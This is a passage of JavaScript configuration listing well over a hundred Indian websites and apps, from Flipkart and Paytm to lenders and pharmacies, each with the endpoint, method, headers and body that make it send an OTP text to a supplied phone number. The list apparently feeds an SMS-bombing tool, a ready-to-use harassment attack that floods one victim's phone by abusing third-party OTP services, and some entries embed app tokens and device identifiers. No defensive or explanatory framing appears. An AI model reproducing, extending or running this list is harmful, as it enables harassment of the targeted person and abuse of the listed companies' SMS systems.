        url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "device_id": "android123", "model": "Google,Android SDK built for x86,10"})
    },
    {
        name: "Spencer's",
        url: "https://jiffy.spencers.in/user/auth/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "PayMe India",
        url: "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "app_signature": "S10ePIIrbH3"})
    },
    {
        name: "Shopper's Stop",
        url: "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "type": "SIGNIN_WITH_MOBILE"})
    },
    {
        name: "Lifestyle Stores",
        url: "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"signInMobile": phone, "channel": "sms"})
    },
    {
        name: "HomeTriangle",
        url: "https://hometriangle.com/api/partner/xauth/signup/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Tata Motors",
        url: "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "sendOtp": "true"})
    },
    {
        name: "TrulyMadly",
        url: "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "locale": "IN"})
    },
    {
        name: "Apna",
        url: "https://production.apna.co/api/userprofile/v1/otp/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "hash_type": "play_store"})
    },
    {
        name: "Country Delight",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "platform": "Android", "mode": "new_user"})
    },
    {
        name: "BetterHalf",
        url: "https://api.betterhalf.ai/v2/auth/otp/send/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isd_code": "91"})
    },
    {
        name: "Nuvama Wealth",
        url: "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobileNo": phone, "emailID": "test@example.com"})
    },
    {
        name: "Mpokket",
        url: "https://web-api.mpokket.in/registration/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "More Retail",
        url: "https://omni-api.moreretail.in/api/v1/login/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "hash_key": "XfsoCeXADQA"})
    },
    {
        name: "Charzer",
        url: "https://api.charzer.com/auth-service/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "appSource": "CHARZER_APP"})
    },
    {
        name: "BikeFixup",
        url: "https://api.bikefixup.com/api/v2/send-registration-otp",
        method: "POST",
        headers: {"Content-Type": "application/json", "client": "app"},
        data: (phone) => JSON.stringify({"phone": phone, "app_signature": "4pFtQJwcz6y"})
    },
    {
        name: "Foxy SMS",
        url: "https://www.foxy.in/api/v2/users/send_otp",
        method: "POST",
        headers: {"Content-Type": "application/json", "Platform": "web"},
        data: (phone) => JSON.stringify({"user": {"phone_number": `+91${phone}`}, "via": "sms"})
    },
    {
        name: "Licius",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "captcha_token": null})
    },
    {
        name: "NoBroker v1",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "phone=%2B91{phone}" }
    },
    {
        name: "Breeze Session",
        url: "https://api.breeze.in/session/start",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "authVerificationType": "otp", "countryCode": "+91"})
    },
    {
        name: "Zoho Store",
        url: "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN",
        method: "POST",
        headers: {"Accept": "*/*", "Content-Length": "0"}
    },
    {
        name: "Aditya Birla New",
        url: "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Muthoot Finance",
        url: "https://www.muthootfinance.com/smsapi.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "mobile={phone}&pin=XjtYYEdhP0haXjo3" }
    },
    {
        name: "GoPaySense",
        url: "https://api.gopaysense.com/users/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "IIFL SMS",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "apply_for=18&full_name=Test&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1" }
    },
    {
        name: "BankOpen",
        url: "https://v2-api.bankopen.co/users/register/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"username": phone, "is_open_capital": 1})
    },
    {
        name: "Tata Capital Retail SMS",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})
    },
    {
        name: "TradeIndia SMS",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": `+91${phone}`})
    },
    {
        name: "Orange Health",
        url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_number": phone, "customer_auto_fetch_message": true})
    },
    {
        name: "AstroSage SMS",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Freedo Rentals",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"email_id": "test@gmail.com", "first_name": "Test", "mobile_number": phone})
    },
    {
        name: "Bisleri",
        url: "https://apis.bisleri.com/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"email": "test@gmail.com", "mobile": phone})
    },
    {
        name: "QuickRide",
        url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        method: "POST",
        headers: {"APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride" }
    },
    {
        name: "Clovia",
        url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true",
        method: "GET",
        headers: {}
    },
    {
        name: "Vahak",
        url: "https://api.vahak.in/v1/u/o_w",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "scope": 0, "is_whatsapp": false})
    },
    {
        name: "Ixigo SMS",
        url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "sixDigitOTP=true&prefix=%2B91&phone={phone}&resendOnWhatsapp=false" }
    },
    {
        name: "Zerodha SMS",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        headers: {"Content-Type": "application/json;charset=UTF-8"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "zerodha", "partner_id": ""})
    },
    {
        name: "Testbook SMS",
        url: "https://api.testbook.com/api/v2/mobile/signup",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "signupDetails": {"page": "HomePage"}})
    },
    {
        name: "Beyoung",
        url: "https://www.beyoung.in/api/sendOtp.json",
        method: "POST",
        headers: {"Content-Type": "application/json;charset=UTF-8"},
        data: (phone) => JSON.stringify({"username": phone, "username_type": "mobile", "service_type": 0})
    },
    {
        name: "MedKart",
        url: "https://app.medkart.in/api/v1/auth/requestOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_no": phone})
    },
    {
        name: "CoverFox",
        url: "https://www.coverfox.com/otp/send/",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "contact={phone}" }
    },
    {
        name: "LoveLocal",
        url: "https://homedeliverybackend.mpaani.com/auth/send-otp",
        method: "POST",
        headers: {"client-code": "vulpix", "Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "role": "CUSTOMER"})
    },
    {
        name: "TyrePlex SMS",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Hotstar SMS",
        url: "https://api.hotstar.com/um/v3/users/register?register-by=phone_otp",
        method: "PUT",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "country_prefix": "91"})
    },
    {
        name: "SonyLIV SMS",
        url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobileNumber": phone, "channelPartnerID": "MSMIND", "country": "IN"})
    },
    {
        name: "Snapdeal SMS",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "j_mobilenumber={phone}&agree=true&j_fullname=TestUser" }
    },
    {
        name: "Zomato SMS",
        url: "https://www.zomato.com/webroutes/auth/login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"country_id": 1, "phone": phone, "verification_type": "sms", "method": "phone"})
    },
    {
        name: "Zomato Login SMS",
        url: "https://www.zomato.com/php/asyncLogin.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phone={phone}&type=sms" }
    },
    {
        name: "Cuemath SMS",
        url: "https://www.cuemath.com/api/v4/parents/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "full_name": "TestUser", "email": "test@gmail.com"})
    },
    {
        name: "Careers360 SMS",
        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile_number={phone}&method=call" }
    },
    {
        name: "Gaana SMS",
        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": `91-${phone}`})
    },
    {
        name: "Flipkart OTP",
        url: "https://www.flipkart.com/api/5/user/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Ullu SMS",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        method: "POST",
        headers: {}
    },
    {
        name: "Paytm SMS Old",
        url: "https://accounts.paytm.com/v2/api/register",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "clientId": "paytm-web-secure"})
    },
    {
        name: "Paytm SMS",
        url: "https://accounts.paytm.com/signin/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Ogonn SMS",
        url: "https://ogonn.in/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Aakash Digital SMS",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobileval={phone}" }
    },
    {
        name: "BigCash SMS",
        url: "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        method: "GET",
        headers: {"Referer": "https://www.bigcash.live/games/poker"}
    },
    {
        name: "MyGov SMS",
        url: "https://auth.mygov.in/regapi/register_api_ver1/?mobile={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "MagicPin SMS",
        url: "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": `91${phone}`, "authMethod": "sms", "token": ""})
    },
    {
        name: "HeroFinCorp GET",
        url: "https://festive.api.herofincorp.com/v1/customer/otp/{phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "MuscleBlaze SMS",
        url: "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9",
        method: "GET",
        headers: {}
    },
    {
        name: "RedBus OTP",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91",
        method: "GET",
        headers: {}
    },
    {
        name: "Univest OTP",
        url: "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "WorkIndia",
        url: "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        method: "GET",
        headers: {}
    },
    {
        name: "Jockey SMS",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        method: "GET",
        headers: {}
    },
    {
        name: "Vyapar OTP",
        url: "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "ConfirmTkt",
        url: "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "CodFirm",
        url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&storeUrl=bellavita1.myshopify.com",
        method: "GET",
        headers: {}
    },
    {
        name: "Coolwinks",
        url: "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Zee5 OTP",
        url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "BookMyShow SMS",
        url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "phone", "subChannel": "sms", "details": {"phone": phone, "origin": "https://in.bookmyshow.com"}})
    },
    {
        name: "BigBasket SMS",
        url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"identifier": phone})
    },
    {
        name: "Dominos SMS",
        url: "https://api.dominos.co.in/loginhandler/forgotpassword",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "firstName": "", "lastName": ""})
    },
    {
        name: "BurgerKing SMS",
        url: "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_no": phone})
    },
    {
        name: "PaisaOnSalary",
        url: "https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
    },
    {
        name: "CashKredit",
        url: "https://api.cashkredit.in/v2/apply-loan/register-user",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"pan": "ABCDE1234F", "name": "Test", "mobile": phone, "email": "test@gmail.com", "terms": "1"})
    },
    {
        name: "RupeeLending",
        url: "https://rupeelending.com/apply-now/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "BrightLoans",
        url: "https://brightloans.in/login-sbm",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "SalaryTopUp",
        url: "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
    },
    {
        name: "TataCapital PL",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobileNumber": phone, "deviceOS": "Web", "applSource": "PL"})
    },
    {
        name: "INRFlash",
        url: "https://offers.inrflash.com/campinr/index.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "action=send_otp&phoneNo={phone}" }
    },
    {
        name: "CRMSL",
        url: "https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
    },
    {
        name: "Moglix V2",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-platform": "PWA"},
        data: (phone) => JSON.stringify({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "37.3.1"})
    },
    {
        name: "MyMoneyBazaar",
        url: "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone})
    },
    {
        name: "Shopsy",
        url: "https://www.shopsy.in/1.rome/api/1/action/view",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"actionRequestContext": {"loginId": phone, "loginType": "MOBILE", "verificationType": "OTP", "type": "LOGIN_IDENTITY_VERIFY"}})
    },
    {
        name: "PrimeCash",
        url: "https://api.primecash.app/api/v1/user",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isTNCVerified": true, "hash": "O9BmoTki4+6"})
    },
    {
        name: "Allen",
        url: "https://api.allen-live.in/api/v1/auth/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-device-id": "9aad014a-4181-4fe7-99e1-9ac721e538b4", "x-client-type": "mweb"},
        data: (phone) => JSON.stringify({"country_code": "91", "phone_number": phone, "persona_type": "STUDENT"})
    },
    {
        name: "SalaryOnTime",
        url: "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "sourceId": 1})
    },
    {
        name: "ClickMyLoan",
        url: "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone})
    },
    {
        name: "Creditt",
        url: "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent",
        method: "POST",
        headers: {"Content-Type": "application/json", "appStore": "web_app", "api_version": "1.0"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "UdharCapital",
        url: "https://www.udharcapital.com/api/send_otp.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "RojgarKaro",
        url: "https://rojgarkaro.in/api/auth/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_no": phone, "isSessionActive": false})
    },
    {
        name: "BajajFinserv",
        url: "https://apigateway.bajajfinserv.in/apigateway/otp/sso",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobileNumber": phone, "source": "WEB"})
    },
    {
        name: "TataCliq",
        url: "https://www.tatacliq.com/api/v1/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "state": "login"})
    },
    {
        name: "Droom",
        url: "https://api.droom.in/v1/user/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
    },
    {
        name: "CureFoods",
        url: "https://web.curefoods.com/api/v2/auth/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "country_code": "+91"})
    },
    {
        name: "Puma",
        url: "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "dwfrm_phone={phone}&format=ajax" }
    },
    {
        name: "Decathlon",
        url: "https://www.decathlon.in/api/v1/auth/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isLogin": true})
    },
    {
        name: "Zivame SMS",
        url: "https://www.zivame.com/auth/public/v1/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "IN"})
    },
    {
        name: "PolicyBazaar",
        url: "https://www.policybazaar.com/api/v1/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "web"})
    },
    {
        name: "CityFurnish",
        url: "https://www.cityfurnish.com/api/v1/auth/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Goibibo SMS",
        url: "https://www.goibibo.com/api/v2/auth/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "countryCode": "+91"})
    },
    {
        name: "PocketMoney SMS",
        url: "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?verification_phone={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Oziva SMS",
        url: "https://api.prod.oziva.in/nitro/send/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "source": "order_management", "type": "sms"})
    },
    {
        name: "Astroyogi SMS",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"PhoneNumber": phone, "PhoneCode": "91", "Domain": "Web"})
    },
    {
        name: "Refyne SMS",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "SMS", "recipient": phone})
    },
    {
        name: "HERE SMS",
        url: "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "sms"})
    },
    {
        name: "VisitApp SMS",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": 91, "platform": "WEB"})
    },
    {
        name: "MakeMyTrip SMS",
        url: "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"loginId": phone, "type": 6, "channel": ["MOBILE"], "countryCode": "91"})
    },
    {
        name: "FreeCharge SMS",
        url: "https://www.freecharge.in/api/ims/rest/otp/resend",
        method: "POST",
        headers: {"Content-Type": "application/json", "fcChannel": "12"},
        data: (phone) => JSON.stringify({"otpThroughCall": false, "platformType": "WEB"})
    },
    {
        name: "Ajio SMS",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"firstName": "Test", "login": "test@gmail.com", "password": "Test@123", "mobileNumber": phone, "requestType": "SENDOTP"})
    },
    {
        name: "AJIO SMS New",
        url: "https://www.ajio.com/api/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Grofers SMS",
        url: "https://grofers.com/v2/accounts/",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "user_phone={phone}" }
    },
    {
        name: "Sulekha",
        url: "https://myaccount.sulekha.com/network/userauthv1.aspx",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Country Delight GET",
        url: "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Eka Care",
        url: "https://auth.eka.care/auth/resend",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Planet Fashion",
        url: "https://www.planetfashion.in/login/resendOTP?isAjax=true",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "OkCredit",
        url: "https://web.okcredit.in/api/authn/v1.0/otp:request",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Naaptol SMS",
        url: "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Star Health",
        url: "https://www.starhealth.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "MobiKwik SMS",
        url: "https://www.mobikwik.com/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Shopclues SMS",
        url: "https://www.shopclues.com/api/v1/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Croma SMS",
        url: "https://api.croma.com/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Myntra SMS",
        url: "https://www.myntra.com/gw/mobile-auth/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Blinkit New",
        url: "https://blinkit.com/api/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "PharmEasy New",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Practo New",
        url: "https://accounts.practo.com/send_otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "country_code": "91"})
    },
    {
        name: "PizzaHut SMS",
        url: "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "countryCode": "91"})
    },
    {
        name: "Ref-R Lenskart",
        url: "https://www.ref-r.com/clients/lenskart/smsApi",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Apollo Pharmacy",
        url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "PinkNBlu",
        url: "https://pinknblu.com/v1/auth/generate/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Delhivery Direct",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Dream11 GraphQL",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "channel": "sms"})
    },
    {
        name: "Olacabs Login",
        url: "https://accounts.olacabs.com/api/login",
        method: "POST",
